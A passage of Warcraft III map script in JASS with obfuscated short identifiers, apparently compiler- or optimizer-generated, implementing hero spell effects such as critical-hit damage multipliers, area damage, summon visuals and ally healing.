call ng(Hu,Hu,"Crit x3! ",.028,255,0,255,0)
elseif ua(Hu) then
set Hb=Hb*2
call ng(Hu,Hu,"Crit x2! ",.028,255,0,0,0)
elseif ub(Hu) then
set Hb=Hb*3/2
call ng(Hu,Hu,"Crit x1.5! ",.028,255,255,0,0)
endif
set Pq=Hu
set Nu=R2I(Hb)
call ForGroup(Na,function nB)
set Mc=false
loop
exitwhen not not Mc
set Nv=FirstOfGroup(Na)
if Nv==null then
set Mc=true
else
set Nk=GetUnitLoc(Nv)
set NQ=CreateUnitAtLoc(Player(Ma),$68303739,Ht,0)
call UnitAddAbility(NQ,$4131324D)
call IssueTargetOrder(NQ,"magicleash",Nv)
call nD(NQ,2)
set NQ=null
call RemoveLocation(Nk)
set Nk=null
call GroupRemoveUnit(Na,Nv)
endif
endloop
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
set Mc=false
loop
exitwhen not not Mc
set Nv=FirstOfGroup(Na)
if Nv==null then
set Mc=true
else
call m2(Nv,L9*R2I(GetUnitState(Nv,UNIT_STATE_MAX_LIFE)*.05))
call GroupRemoveUnit(Na,Nv)
endif
endloop
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$41313250 then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
set L9=CountUnitsInGroup(Na)
set Hb=I2R(GetHeroInt(Hu,true)*10+5000)*N0[Ma+1]
if uZ(Hu) then
set Hb=Hb*3
call ng(Hu,Hu,"Crit x3! ",.028,255,0,255,0)
elseif ua(Hu) then
set Hb=Hb*2
call ng(Hu,Hu,"Crit x2! ",.028,255,0,0,0)
elseif ub(Hu) then
set Hb=Hb*3/2
call ng(Hu,Hu,"Crit x1.5! ",.028,255,255,0,0)
endif
set Pq=Hu
set Nu=R2I(Hb)
call ForGroup(Na,function nB)
set Mc=false
loop
exitwhen not not Mc
set Nv=FirstOfGroup(Na)
if Nv==null then
set Mc=true
else
set Nk=GetUnitLoc(Nv)
set NQ=CreateUnitAtLoc(Player(Ma),$68303739,Ht,0)
call UnitAddAbility(NQ,$4131324D)
call IssueTargetOrder(NQ,"magicleash",Nv)
call nD(NQ,2)
set NQ=null
call RemoveLocation(Nk)
set Nk=null
call GroupRemoveUnit(Na,Nv)
endif
endloop
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
set Mc=false
loop
exitwhen not not Mc
set Nv=FirstOfGroup(Na)
if Nv==null then
set Mc=true
else
call m2(Nv,L9*R2I(GetUnitState(Nv,UNIT_STATE_MAX_LIFE)*.05))
call GroupRemoveUnit(Na,Nv)
endif
endloop
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
call RemoveLocation(Ht)
set Ht=null
endif
set Hu=null
set NQ=null
set Nv=null
endfunction
function ud takes nothing returns nothing
set Wx=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wx,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wx,function uc)
endfunction
function ue takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930394A)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49303952)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$7370726F)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304B31)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304E30)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305748)==true then
return true
endif
return false
endfunction
function uf takes nothing returns boolean
if not ue() then
return false
endif
return true
endfunction
function ug takes nothing returns boolean
if not (GetRandomInt(1,5)==1) then
return false
endif
return true
endfunction
function uh takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304B31)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304E30)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305748)==true then
return true
endif
return false
endfunction
function ui takes nothing returns boolean
if not uh() then
return false
endif
return true
endfunction
function uj takes nothing returns boolean
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function uk takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304E30)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305748)==true then
return true
endif
return false
endfunction
function ul takes nothing returns boolean
if not uk() then
return false
endif
return true
endfunction
function um takes nothing returns boolean
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function un takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function uo takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function up takes nothing returns boolean
return GetBooleanAnd(un(),uo())
endfunction
function uq takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),SJ[11],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function ur takes nothing returns boolean
if not (GetSpellAbilityId()==$53303052) then
return false
endif
return true
endfunction
function us takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930394A)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49303952)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$7370726F)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304B31)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304E30)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305748)==true then
return true
endif
return false
endfunction
function ut takes nothing returns boolean
if not us() then
return false
endif
return true
endfunction
function uu takes nothing returns boolean
if not (GetRandomInt(1,5)==1) then
return false
endif
return true
endfunction
function uv takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304B31)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304E30)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305748)==true then
return true
endif
return false
endfunction
function uw takes nothing returns boolean
if not uv() then
return false
endif
return true
endfunction
function ux takes nothing returns boolean
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function uy takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304E30)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305748)==true then
return true
endif
return false
endfunction
function uz takes nothing returns boolean
if not uy() then
return false
endif
return true
endfunction
function u0 takes nothing returns boolean
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function u1 takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function u2 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function u3 takes nothing returns boolean
return GetBooleanAnd(u1(),u2())
endfunction
function u4 takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),SJ[11],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function u5 takes nothing returns boolean
if not (GetSpellAbilityId()==$53303056) then
return false
endif
return true
endfunction
function u6 takes nothing returns nothing
local unit Mc
local integer No
local integer Np
local integer Nt
local integer Ny
if ur() then
set Wz=GetSpellTargetLoc()
call TriggerSleepAction(1.)
set Mc=CreateUnitAtLoc(GetOwningPlayer(GetTriggerUnit()),$6E30374F,Wz,0)
call nD(Mc,30)
set No=GetPlayerId(GetOwningPlayer(GetTriggerUnit()))+1
set Np=GetHeroInt(GetTriggerUnit(),true)+100*GetUnitAbilityLevel(GetTriggerUnit(),$53303052)+GetHeroInt(GetTriggerUnit(),true)*UM[No]/100
call nj(Mc,Np)
set Nt=R2I(GetUnitState(GetTriggerUnit(),UNIT_STATE_LIFE)/2)+R2I(GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_LIFE)/2)*UM[No]/100
call nk(Mc,Nt)
set Ny=GetHeroInt(GetTriggerUnit(),true)/10+15*GetUnitAbilityLevel(GetTriggerUnit(),$53303052)+GetHeroInt(GetTriggerUnit(),true)/10*UM[No]/100
call nl(Mc,Ny)
set Mc=null
set SJ[11]=3.*I2R(GetHeroInt(GetTriggerUnit(),true))*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+0.
if um() then
if ul() then
call CreateTextTagUnitBJ("|c00ff0000Crit x3|r
",GetTriggerUnit(),0,10.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set SJ[11]=SJ[11]+SJ[11]*2.
else
endif
else
if uj() then
if ui() then
call CreateTextTagUnitBJ("|c00ff00ffCrit x 2|r
",GetTriggerUnit(),0,10.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set SJ[11]=SJ[11]+SJ[11]*1.
else
endif
else
if ug() then
if uf() then
call CreateTextTagUnitBJ("|c00ff7f00Crit x 1.5|r
",GetTriggerUnit(),0,10.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set SJ[11]=SJ[11]+SJ[11]/2.
else
endif
else
endif
endif
endif
set SR=GetUnitsInRangeOfLocMatching(400.,Wz,Condition(function up))
call ForGroupBJ(SR,function uq)
call RemoveLocation(Wz)
call DestroyGroup(SR)
set SJ[11]=0.
else
endif
if u5() then
set Wz=GetSpellTargetLoc()
call TriggerSleepAction(1.)
set Mc=CreateUnitAtLoc(GetOwningPlayer(GetTriggerUnit()),$6E30374F,Wz,0)
call nD(Mc,30)
set No=GetPlayerId(GetOwningPlayer(GetTriggerUnit()))+1
set Np=GetHeroInt(GetTriggerUnit(),true)*3/2+1000+GetHeroInt(GetTriggerUnit(),true)*3/2*UM[No]/100
call nj(Mc,Np)
set Nt=R2I(GetUnitState(GetTriggerUnit(),UNIT_STATE_LIFE))+R2I(GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_LIFE))*UM[No]/100
call nk(Mc,Nt)
set Ny=GetHeroInt(GetTriggerUnit(),true)/10+150+GetHeroInt(GetTriggerUnit(),true)/10*(UM[No]/100)
call nl(Mc,Ny)
set Mc=null
set SJ[11]=7.*I2R(GetHeroInt(GetTriggerUnit(),true))*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+0.
if u0() then
if uz() then
call CreateTextTagUnitBJ("|c00ff0000Crit x3|r
",GetTriggerUnit(),0,10.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set SJ[11]=SJ[11]+SJ[11]*2.
else
endif
else
if ux() then
if uw() then
call CreateTextTagUnitBJ("|c00ff00ffCrit x 2|r
",GetTriggerUnit(),0,10.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set SJ[11]=SJ[11]+SJ[11]*1.
else
endif
else
if uu() then
if ut() then
call CreateTextTagUnitBJ("|c00ff7f00Crit x 1.5|r
",GetTriggerUnit(),0,10.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set SJ[11]=SJ[11]+SJ[11]/2.
else
endif
else
endif
endif
endif
set SR=GetUnitsInRangeOfLocMatching(400.,Wz,Condition(function u3))
call ForGroupBJ(SR,function u4)
call RemoveLocation(Wz)
call DestroyGroup(SR)
set SJ[11]=0.
else
endif
endfunction
function u7 takes nothing returns nothing
set Wy=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wy,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wy,function u6)
endfunction
function u8 takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local unit NQ
call mz(Pq,Hu,Nu)
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call UnitAddAbility(NQ,$4131324E)
call nD(NQ,1)
call IssueTargetOrder(NQ,"creepthunderbolt",Hu)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\NightElf\\EntanglingRoots\\EntanglingRootsTarget.mdl",Hu,"origin"))
call RemoveLocation(Ht)
set NQ=null
set Hu=null
set Ht=null
endfunction
function u9 takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),$41313356)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function vB takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local location Mc
local string No
local group Np
local boolexpr Nt
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=GetUnitLoc(Hu)
set No=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set No="war3mapImported\\EarthNova.mdx"
endif
call DestroyEffect(AddSpecialEffect(No,GetLocationX(Mc),GetLocationY(Mc)))
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),600,Nt)
call DestroyBoolExpr(Nt)
set Nu=2500+GetHeroStr(Hu,true)*7
set Pq=Hu
call ForGroup(Np,function u8)
call DestroyGroup(Np)
call RemoveLocation(Mc)
set Mc=null
set Nt=null
else
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set Np=null
endfunction
function vC takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local location Mc
local string No
local group Np
local boolexpr Nt
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=GetUnitLoc(Hu)
set No=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set No="war3mapImported\\EarthNova.mdx"
endif
call DestroyEffect(AddSpecialEffect(No,GetLocationX(Mc),GetLocationY(Mc)))
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),600,Nt)
call DestroyBoolExpr(Nt)
set Nu=GetUnitAbilityLevel(Hu,$41313044)*(500+GetHeroStr(Hu,true)*2)
set Pq=Hu
call ForGroup(Np,function u8)
call DestroyGroup(Np)
call RemoveLocation(Mc)
set Mc=null
set Nt=null
else
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set Np=null
endfunction
function vD takes nothing returns nothing
local integer L9
local unit Hu=GetTriggerUnit()
local unit NQ=GetSpellTargetUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local timer Mc
local location No
local group Np
local boolexpr Nt
if GetSpellAbilityId()==$53303057 then
set L9=(GetHeroStr(Hu,true)+500)*GetUnitAbilityLevel(Hu,$53303057)
call m1(Hu,NQ,R2I(I2R(L9)*Ng[Ma+1]))
elseif GetSpellAbilityId()==$53303058 then
set L9=GetHeroStr(Hu,true)*15+15000
call m1(Hu,NQ,R2I(I2R(L9)*Ng[Ma+1]))
elseif GetSpellAbilityId()==$41313044 then
set Mc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Mc),0,Hu)
call SaveInteger(PP,GetHandleId(Mc),1,4)
call TimerStart(Mc,2.2,true,function vC)
set Mc=null
elseif GetSpellAbilityId()==$4130565A then
set Mc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Mc),0,Hu)
call SaveInteger(PP,GetHandleId(Mc),1,5)
call TimerStart(Mc,2.2,true,function vB)
set Mc=null
elseif GetSpellAbilityId()==$41313031 then
set No=GetSpellTargetLoc()
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),200,Nt)
call DestroyBoolExpr(Nt)
set Nu=GetUnitAbilityLevel(Hu,$41313031)*100+GetHeroStr(Hu,true)*5
set Pq=Hu
call ForGroup(Np,function nB)
call DestroyGroup(Np)
set Np=CreateGroup()
set Nt=Condition(function mw)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),200,Nt)
call DestroyBoolExpr(Nt)
set Nu=GetUnitAbilityLevel(Hu,$41313031)*200+GetHeroStr(Hu,true)*3
call ForGroup(Np,function m4)
call DestroyGroup(Np)
call RemoveLocation(No)
set No=null
set Nt=null
set Np=null
elseif GetSpellAbilityId()==$4130504C then
call UnitAddAbility(GetSpellTargetUnit(),$41313356)
call SetUnitAbilityLevel(GetSpellTargetUnit(),$41313356,GetUnitAbilityLevel(Hu,$4130504C))
set Mc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Mc),0,GetSpellTargetUnit())
call TimerStart(Mc,10,false,function u9)
set Mc=null
endif
set Hu=null
set NQ=null
endfunction
function vE takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function vD)
set Hc=null
endfunction
function vF takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303542
endfunction
function vG takes nothing returns boolean
if not (CountUnitsInGroup(SR)>=4) then
return false
endif
return true
endfunction
function vH takes nothing returns nothing
local string Mc
if GetUnitTypeId(GetSummonedUnit())==$68303542 then
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetSummoningUnit()),Condition(function vF))
if vG() then
call RemoveUnit(GetSummonedUnit())
else
endif
call DestroyGroup(SR)
else
endif
if GetUnitTypeId(GetSummonedUnit())==$6E30314E then
if GetUnitTypeId(GetSummoningUnit())==$4830364E then
call SetUnitVertexColor(GetSummonedUnit(),255,70,120,255)
set Mc=""
if GetOwningPlayer(GetSummonedUnit())==GetLocalPlayer() then
set Mc="war3mapImported\\Rune Blue AuraRoz.mdx"
endif
call AddSpecialEffectTarget(Mc,GetSummonedUnit(),"origin")
else
set Mc=""
if GetOwningPlayer(GetSummonedUnit())==GetLocalPlayer() then
set Mc="war3mapImported\\Rune Blue Aura.mdx"
endif
call AddSpecialEffectTarget(Mc,GetSummonedUnit(),"origin")
endif
else
endif
endfunction
function vI takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SUMMON)
call TriggerAddAction(Hc,function vH)
set Hc=null
endfunction
function vJ takes nothing returns boolean
if GetSpellAbilityId()==$41313336 then
return true
endif
if GetSpellAbilityId()==$41305847 then
return true
endif
return false
endfunction
function vK takes nothing returns boolean
if not vJ() then
return false
endif
return true
endfunction
function vL takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vM takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vN takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vO takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vP takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vQ takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vR takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vS takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vT takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vU takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vV takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vW takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vX takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function vY takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))/5.*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*TQ[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))])
call AddSpecialEffectTargetUnitBJ("overhead",GetEnumUnit(),"Abilities\\Weapons\\BallistaMissile\\BallistaMissileTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function vZ takes nothing returns nothing
